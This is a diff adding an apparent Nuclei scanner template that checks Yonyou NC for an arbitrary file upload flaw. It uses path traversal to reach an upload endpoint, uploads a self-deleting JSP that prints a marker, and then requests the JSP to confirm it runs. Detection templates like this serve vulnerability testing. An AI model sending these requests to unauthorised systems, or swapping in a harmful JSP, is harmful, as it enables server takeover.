@@ -1,0 +1,44 @@
+id: yonyou-nc-uploadFile-fileupload
+
+info:
+  name: yonyou-nc-uploadFile-fileupload
+  author: HuanXiong
+  severity: critical
+  description: |-
+    
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+        POST /mp/login/../uploadControl/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Content-Length: 314
+
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Content-Disposition: form-data; name="submit"
+
+        上传
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp--
+        
+      - |
+        GET /mp/uploadFileDir/{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
